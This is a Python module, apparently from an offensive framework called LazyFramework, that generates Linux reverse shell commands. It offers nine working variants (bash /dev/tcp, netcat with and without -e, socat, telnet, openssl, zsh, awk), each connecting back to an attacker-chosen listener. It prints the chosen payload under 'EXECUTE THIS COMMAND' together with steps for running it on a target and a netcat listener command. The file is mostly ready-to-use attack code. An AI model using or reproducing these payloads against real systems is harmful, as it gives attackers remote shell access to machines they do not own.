# /root/lazy1/modules/payloads/reverse/linux/bash_tcp.py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

MODULE_INFO = {
    "name": "Linux Bash Reverse TCP (Advanced)",
    "description": "Advanced bash reverse shell with multiple connection methods and evasion",
    "author": "LazyFramework Team", 
    "license": "MIT",
    "platform": "Linux/Unix",
    "arch": "x86/x64/ARM",
    "rank": "Excellent",
    "dependencies": []
}

OPTIONS = {
    "lhost": {
        "description": "Listener IP address",
        "required": True,
        "default": "192.168.1.100"
    },
    "lport": {
        "description": "Listener port", 
        "required": True,
        "default": "4444"
    },
    "method": {
        "description": "Connection method",
        "required": False,
        "default": "dev_tcp",
        "choices": ["dev_tcp", "nc", "nc_e", "nc_busybox", "socat", "telnet", "openssl", "zsh", "awk"]
    },
    "shell": {
        "description": "Shell type",
        "required": False,
        "default": "bash",
        "choices": ["bash", "sh", "dash", "zsh"]
    },
    "background": {
        "description": "Run in background",
        "required": False,
        "default": "false",
        "choices": ["true", "false"]
    }
}

def generate_bash_reverse(lhost, lport, method="dev_tcp", shell="bash", background=False):
    """Generate advanced bash reverse shell"""
    
    payloads = {
        "dev_tcp": f"{shell} -i >& /dev/tcp/{lhost}/{lport} 0>&1",
        
        "nc": f"nc {lhost} {lport} -e {shell}",
        
        "nc_e": f"nc -e {shell} {lhost} {lport}",
        
        "nc_busybox": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shell} -i 2>&1|nc {lhost} {lport} >/tmp/f",
        
        "socat": f"socat TCP:{lhost}:{lport} EXEC:'{shell} -i',pty,stderr,setsid,sigint,sane",
        
        "telnet": f"telnet {lhost} {lport} | {shell} | telnet {lhost} {lport}",
        
        "openssl": f"mkfifo /tmp/s; {shell} -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {lhost}:{lport} > /tmp/s; rm /tmp/s",
        
        "zsh": f"zsh -c 'zmodload zsh/net/tcp && ztcp {lhost} {lport} && {shell} <&$REPLY >&$REPLY 2>&$REPLY'",
        
        "awk": f"awk 'BEGIN{{s=\"/inet/tcp/0/{lhost}/{lport}\";while(1){{do{{printf \"> \"|&s;s|&getline c;if(c){{while((c|&getline)>0)print $0|&s;close(c)}}}}while(c!=\"exit\")close(s)}}}}'"
    }
    
    payload = payloads.get(method, payloads["dev_tcp"])
    
    if background:
        payload = f"({payload}) &"
    
    return payload

def run(session, options):
    lhost = options.get("lhost", "192.168.1.100")
    lport = options.get("lport", "4444")
    method = options.get("method", "dev_tcp")
    shell = options.get("shell", "bash")
    background = options.get("background", "false").lower() == "true"
    
    console.print("\n[bold green]🔄 Linux Bash Reverse TCP (Advanced)[/bold green]")
    console.print("=" * 60)
    
    payload = generate_bash_reverse(lhost, lport, method, shell, background)
    
    # Display comprehensive information
    info_table = Table(show_header=True, header_style="bold cyan", box=box.ROUNDED)
    info_table.add_column("Parameter", style="green")
    info_table.add_column("Value", style="yellow")
    
    info_table.add_row("Listener", f"{lhost}:{lport}")
    info_table.add_row("Platform", "Linux/Unix")
    info_table.add_row("Method", method)
    info_table.add_row("Shell", shell)
    info_table.add_row("Background", str(background))
    info_table.add_row("Required Tools", get_required_tools(method))
    
    console.print(info_table)
    
    console.print(f"\n[bold yellow]📦 Generated Payload:[/bold yellow]")
    console.print(Panel(payload, border_style="red", title="EXECUTE THIS COMMAND"))
    
    # Usage instructions
    console.print(f"\n[bold green]🚀 Usage Instructions:[/bold green]")
    console.print("1. Copy the payload above")
    console.print("2. Execute on target Linux system")
    console.print("3. Ensure listener is running first")
    
    if background:
        console.print("4. Payload will run in background")
    
    console.print(f"\n[bold blue]🎯 Listener Command:[/bold blue]")
    console.print(f"nc -lnvp {lport}")
    
    # Show all alternative methods
    console.print(f"\n[bold magenta]🔧 All Available Methods:[/bold magenta]")
    methods_info = {
        "dev_tcp": "Bash built-in /dev/tcp (most reliable)",
        "nc": "Netcat traditional",
        "nc_e": "Netcat with -e flag", 
        "nc_busybox": "Netcat without -e flag",
        "socat": "Socat (feature-rich)",
        "telnet": "Telnet based",
        "openssl": "SSL encrypted",
        "zsh": "Zsh built-in TCP",
        "awk": "Awk based (uncommon)"
    }
    
    for m, desc in methods_info.items():
        status = " ✅" if m == method else "  "
        console.print(f"  {status} [cyan]{m:12}[/cyan] - [dim]{desc}[/dim]")
    
    return payload

def get_required_tools(method):
    """Get required tools for each method"""
    tools = {
        "dev_tcp": "bash",
        "nc": "netcat",
        "nc_e": "netcat",
        "nc_busybox": "netcat, mkfifo",
        "socat": "socat", 
        "telnet": "telnet",
        "openssl": "openssl, mkfifo",
        "zsh": "zsh",
        "awk": "awk"
    }
    return tools.get(method, "bash")
